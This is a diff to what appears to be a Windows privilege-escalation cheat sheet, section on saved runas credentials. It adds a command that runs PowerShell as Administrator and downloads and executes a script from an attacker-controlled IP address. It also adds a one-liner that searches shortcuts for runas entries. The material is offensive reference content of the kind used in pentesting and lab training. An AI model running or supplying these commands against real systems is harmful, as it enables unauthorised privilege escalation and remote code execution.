@@ -842,7 +842,14 @@ If credentials are saved, they may be usable with tools such as:
 ```cmd
 runas /savecred /user:<DOMAIN>\<USERNAME> cmd.exe
 ```
+```cmd
+runas /savedcred /user:ACCESS\Administrator "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.239:8000/admin.ps1')"
+```
 
+Check if shortcut exists:
+```bash
+Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
+```
 ---
 
 ## Browser Credential Tools
